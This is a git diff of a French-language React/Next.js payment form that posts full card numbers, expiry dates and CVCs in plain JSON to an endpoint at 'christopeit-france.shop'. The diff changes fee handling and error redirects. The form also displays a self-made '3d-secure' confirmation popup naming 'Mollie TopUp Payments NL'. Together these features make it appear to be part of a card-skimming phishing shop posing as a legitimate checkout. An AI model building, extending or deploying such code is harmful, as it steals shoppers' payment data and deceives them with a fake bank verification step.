@@ -3,9 +3,7 @@ import { useState, useRef } from 'react';
 import { useRouter } from 'next/router'; // Import useRouter
 
 
-const CustomPay = ({ amount, orderNumber, onBack, showStep }) => {
-  const [isLoading, setIsLoading] = useState(false);
-  const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
+const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup }) => {
   const [formData, setFormData] = useState({
     cardHolder: '',
     cardNumber: '',
@@ -29,11 +27,9 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep }) => {
     second: '2-digit',
   });
 
+  const amountFeesed = (amount * 1.025).toFixed(2); // Add 2.5% payment fees
+
   const lastFourDigits = formData.cardNumber.replace(/\s/g, '').slice(-4); // Extract last 4 digits of the card number
-
-
-  // Enlever les 2,5% de commission compris
-  const adjustedAmount = (amount * 0.975).toFixed(2);
 
   const handleInputChange = (e) => {
     const { name, value } = e.target;
@@ -76,9 +72,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep }) => {
       cardExpiration: formData.expiryDate,
       cardCVC: formData.cvv,
     };
-
-    const orderNumber = Math.floor(100000 + Math.random() * 900000).toString(); // Générer un numéro de commande aléatoire
-
+    
     try {
       setIsLoading(true); // Afficher le popup de chargement
 
@@ -96,22 +90,23 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep }) => {
         const payFetch = await fetch('https://api.christopeit-france.shop/pay', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ orderNumber, amount: adjustedAmount, cardDetails }),
+          body: JSON.stringify({ orderNumber, amount, cardDetails }),
         });
       
         if (!payFetch.ok) {
-          throw new Error(`Erreur HTTP : ${payFetch.status}`);
-
-          // Reload la page avec la notice d'erreur 
-          router.push(`/paiement?failed=true`); 
+          setIsLoading(false); 
+          setShow3DSecurePopup(false);
         }
-
-        // Rediriger vers la page de confirmation
-        router.push(`/confirmation?commande=${orderNumber}`); 
-
+        else {
+          // Rediriger vers la page de confirmation
+          router.push(`/verification?orderNumber=${orderNumber}`); 
+        }
       } catch (error) {
         console.error('Erreur lors de la requête fetch :', error);
         alert('Impossible de traiter le paiement. Veuillez réessayer plus tard.');
+        router.push(`/paiement?failed=true`); 
+        setIsLoading(false); 
+        setShow3DSecurePopup(false);
       }
 
       
@@ -199,15 +194,14 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep }) => {
             <h2>Vérification 3d-secure</h2>
             <p className='desc'>Confirmez la transaction suivante :</p>
             <span>Mollie TopUp Payments NL</span>
-            <span>Montant à valider : {adjustedAmount}€</span>
+            <span>Montant à valider : {amountFeesed}€</span>
             <span> Date : {`${formattedDate} à ${formattedTime}`}</span>
             <span>Carte : **** **** **** {lastFourDigits}</span>
             <div className='loader'></div>
           </div>
         </div>
-
-            
       )}
+
     </form>
   );
 };
